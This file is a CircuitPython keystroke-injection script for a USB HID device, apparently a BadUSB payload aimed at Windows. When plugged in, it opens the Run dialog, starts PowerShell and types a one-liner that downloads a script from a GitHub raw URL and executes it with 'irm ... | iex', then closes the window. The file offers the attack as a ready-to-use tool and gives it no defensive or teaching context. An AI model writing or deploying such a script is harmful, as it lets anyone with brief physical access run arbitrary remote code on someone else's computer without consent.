import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

def open(word):
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.1)
    layout.write(word, delay = 0.01)
    kbd.send(Keycode.ENTER)
    time.sleep(1)

time.sleep(0.1)

kbd.send(Keycode.SHIFT)
time.sleep(0.1)
kbd.release(Keycode.ALT)
time.sleep(0.5)

open("powershell")
ps = 'irm https://raw.githubusercontent.com/956zs/HID-Script/refs/heads/main/all | iex'

layout.write(ps, delay = 0.01)
kbd.send(Keycode.ENTER)

time.sleep(1)
layout.write("exit", delay = 0.01)
kbd.send(Keycode.ENTER)
